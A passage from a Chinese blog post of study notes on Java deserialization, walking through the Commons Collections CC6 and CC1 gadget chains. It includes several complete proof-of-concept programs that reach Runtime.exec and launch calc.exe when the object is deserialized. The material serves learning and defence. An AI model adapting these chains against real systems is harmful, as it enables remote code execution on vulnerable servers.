+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129213907608.png" class title="image-20250129213907608">
+
+<p>依然回到 hashCode 的分析上，前面都一致</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129204852113.png" class title="image-20250129204852113">
+
+<p>在 HashMap#put 方法中，同样能够进行 hash -&gt; hashCode</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129220821800.png" class title="image-20250129220821800">
+
+<p>再往前追，让HashSet#readObject 的 map 属性赋为 HashMap 即可，调用链完成</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129221055792.png" class title="image-20250129221055792">
+
+<p>Exp：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, &quot;useless&quot;);</span><br><span class="line">        HashSet hashSet = new HashSet();              //1. 在 HashMap版基础上修改这三段代码即可</span><br><span class="line">        SetFieldValue(hashSet, &quot;map&quot;, hashMap);       //2</span><br><span class="line">        SetFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        byte[] poc = Serialize(hashSet);              //3</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void UnSerialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SetFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><h4 id="TransformedMap-版"><a href="#TransformedMap-版" class="headerlink" title="TransformedMap 版"></a>TransformedMap 版</h4><p>在已经分析过 CC6 的前提下分析 CC1，从 ChainedTransfomer#transform 继续往前找调用链</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204165540576.png" class title="image-20250204165540576">
+
+<p>在 TransformedMap#checkSetValue 方法调用了 transform，且该方法为 protected 修饰</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204165518306.png" class title="image-20250204165518306">
+
+<p>valueTransformer 属性可以通过 TransformedMap#decorate 返回构造方法赋值，接下来寻找一个调用 checkSetValue 的类</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170216540.png" class title="image-20250204170216540">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170224154.png" class title="image-20250204170224154">
+
+<p>在 AbstractInputCheckedMapDecoratorMapEntry#setValue 方法调用了 checkSetValue<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204170444337.png" class title="image-20250204170444337"></p>
+<p>setValue 也无法被直接调用，继续往前找</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204174232158.png" class title="image-20250204174232158">
+
+<p>在 AnnotationInvocationHandler#readObject 中调用了 setValue 方法，那么接下来根据链子构造代码</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204174625747.png" class title="image-20250204174625747">
+
+<p>初步：</p>
+<p>在序列化 invokerTransformer 时，实质上是序列化了 AnnotationInvocationHandler，因此反序列化时会自动调用其 readObject 方法，也就是 AnnotationInvocationHandler#readObject</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Override.class, transformerMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(invokerTransformer);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在走入 AnnotationInvocationHandler#readObject 后，预期应该步入 for 循环中直至触发 setValue，但实际上却没能触发循环</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206123908107.png" class title="image-20250206123908107">
+
+<p>此时 membersValues 值为空，因此 entrySet() 并没有返回值</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206125415803.png" class title="image-20250206125415803">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(&quot;abc&quot;, &quot;def&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>赋值再看返回值，成功进入到循环体内</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206125323452.png" class title="image-20250206125323452">
+
+<p>接下来要过几层判断</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、memberType/memberTypes 维护的是注解参数的列表，存储了注解类有关的信息</span><br><span class="line">2、memberType.isInstance(value) ||  value instanceof ExceptionProxy)判断类受否能进行强转，||表示前面为真后面也会为真</span><br></pre></td></tr></table></figure></div>
+
+<p>最终：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import com.sun.prism.shader.DrawCircle_LinearGradient_REPEAT_AlphaTest_Loader;</span><br><span class="line">import com.sun.xml.internal.bind.v2.runtime.reflect.opt.Const;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Repeatable;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.instrument.ClassDefinition;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">// import sun.reflect.annotation.AnnotationInvocationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;def&quot;);</span><br><span class="line"></span><br><span class="line">        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Repeatable.class, transformerMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(invokerTransformer);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Ysoserial-版"><a href="#Ysoserial-版" class="headerlink" title="Ysoserial 版"></a>Ysoserial 版</h4><p>Ysoserial 的链子是利用代理模式，与 TransformedMap 版大有不同。</p>
+<p>视线回到 LazyMap#get，接着往前寻找调用 get 方法的类</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207160256483.png" class title="image-20250207160256483">
+
+<p>在 AnnotationInvocationHandler#invoke 方法中调用了 get，那么如何调用 invoke 呢</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207160453299.png" class title="image-20250207160453299">
+
+<p>在代理模式中，不会去执行 Map 接口的 get()、entrySet() 等，而是所有这些方法的调用都会被转发到 InvocationHandler 的 invoke() 方法</p>
+<p>memberValues 是可控的，而 invoke 处允许执行 get，因此我们传入动态代理对象，同时需要进行类型转换 Map，它的 @NotNull InvocationHandler h 是 inInvocationHandler。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207162507684.png" class title="image-20250207162507684">
+
+<p>设置两层代理，外层代理的 memberValues 赋为 Map 类型代理类，代理对象为 AnnotationInvocationHandler，内层代理的 memberValues 赋为 LazyMap，完成利用链闭合</p>
+<p>最终：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler inInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Map.class&#125;, inInvocationHandler);</span><br><span class="line"></span><br><span class="line">        InvocationHandler outInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(outInvocationHandler);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207181543751.png" class title="image-20250207181543751">
+
+
+
+
+
+
+
+
+
+
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Java反序列化学习记录 - CC1 &amp;&amp; CC6</li>
+        <li><strong>作者:</strong> Octopus</li>
+        <li><strong>创建于
+                :</strong> 2025-03-05 20:12:50</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-05 20:24:09
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2025/03/05/Java反序列化学习记录-CC1-CC6/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">资产侦察系统灯塔ARL优化</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">Java反序列化学习记录 - CC1 &amp;&amp; CC6</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS-%E9%93%BE"><span class="nav-text">URLDNS 链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Runtime-%E7%B1%BB"><span class="nav-text">Runtime 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder-%E7%B1%BB"><span class="nav-text">ProcessBuilder 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Processlmpl-%E7%B1%BB"><span class="nav-text">Processlmpl 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-text">一些问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC-%E9%93%BE"><span class="nav-text">CC 链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CC6"><span class="nav-text">CC6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC1"><span class="nav-text">CC1</span></a></li></ol></li></ol>
+
